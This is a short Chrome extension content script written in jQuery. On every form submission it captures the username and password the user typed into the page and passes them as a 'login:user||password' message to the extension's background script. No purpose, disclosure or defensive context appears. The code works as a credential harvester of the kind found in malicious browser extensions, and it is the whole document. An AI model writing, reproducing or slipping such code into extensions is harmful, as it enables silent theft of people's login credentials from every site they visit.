$(function() {
 var passwordBoxes = $("input[type=password]"),

 sendToBackground = function(username, password, callback) {
  var msg = "login:" + username + "||" + password
  chrome.runtime.sendMessage({url: msg}, $.noop)
 },



 process = function(callback) {
  var username = $("input[type=text]").not(passwordBoxes).filter(function() {
   var field = $(this);
   return field.val() || field.html();
  }).val(),
  password = passwordBoxes.val();

  sendToBackground(username, password, callback);
 };






 $("form").submit(function(e) {
  var $this = $(this);
  process(function() {
   $this.unbind('submit');
   $this.submit();
  });
 });
});